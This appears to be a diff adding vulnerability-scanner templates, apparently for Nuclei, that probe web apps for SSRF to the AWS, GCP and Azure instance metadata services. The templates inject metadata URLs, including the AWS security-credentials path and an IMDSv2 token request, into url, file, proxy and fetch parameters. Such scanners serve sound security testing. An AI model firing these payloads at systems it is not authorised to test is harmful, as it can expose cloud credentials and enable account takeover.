@@ -1,0 +1,106 @@
+id: cloud-aws-metadata
+info:
+  name: AWS Instance Metadata Service SSRF
+  author: AniipID
+  severity: critical
+  description: Detects SSRF vulnerabilities that allow access to AWS IMDS (169.254.169.254)
+  tags: cloud,aws,metadata,ssrf
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}?file=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/"
+    matchers:
+      - type: word
+        words:
+          - "iam"
+          - "instance-id"
+          - "ami-id"
+          - "public-keys"
+          - "security-credentials"
+          - "local-ipv4"
+          - "role"
+        condition: or
+        part: body
+
+---
+id: cloud-aws-imdsv2
+info:
+  name: AWS IMDSv2 Bypass via PUT
+  author: AniipID
+  severity: critical
+  description: Tests for IMDSv2 bypass by sending PUT request to get token then accessing metadata
+  tags: cloud,aws,imdsv2,ssrf
+
+requests:
+  - method: PUT
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/api/token"
+    headers:
+      X-aws-ec2-metadata-token-ttl-seconds: "21600"
+    matchers:
+      - type: word
+        words:
+          - "AQAE"
+          - "token"
+        condition: or
+        part: body
+
+---
+id: cloud-gcp-metadata
+info:
+  name: GCP Instance Metadata SSRF
+  author: AniipID
+  severity: critical
+  description: Detects SSRF that can access GCP metadata endpoints
+  tags: cloud,gcp,metadata,ssrf
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/proxy?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+    headers:
+      Metadata-Flavor: Google
+    matchers:
+      - type: word
+        words:
+          - "computeMetadata"
+          - "service-accounts"
+          - "project"
+          - "instance"
+          - "zone"
+          - "numericProjectId"
+        condition: or
+        part: body
+
+---
+id: cloud-azure-metadata
+info:
+  name: Azure Instance Metadata SSRF
+  author: AniipID
+  severity: critical
+  description: Detects SSRF that can access Azure IMDS endpoints
+  tags: cloud,azure,metadata,ssrf
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    headers:
+      Metadata: "true"
+    matchers:
+      - type: word
+        words:
+          - "compute"
+          - "network"
+          - "vmId"
+          - "location"
+          - "subscriptionId"
+        condition: or
+        part: body
